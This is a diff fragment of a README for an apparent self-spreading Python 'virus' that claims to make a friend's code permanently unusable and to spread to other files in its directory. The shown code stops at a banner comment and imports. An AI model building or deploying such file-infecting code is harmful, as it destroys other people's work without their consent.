@@ -5,7 +5,7 @@ So, ever got access to your friend's code, and want to make the code permently u
 Well with this, you can, it's one of the fastest ways to do that, and it also spreads to other files in the dirertory.
 ### How to use it
 You can just copy and paste the code below into the program or copy and paste the code in `main.py`
-```
+```python3
 # VIRUS SAYS HI!
 import sys
 import glob
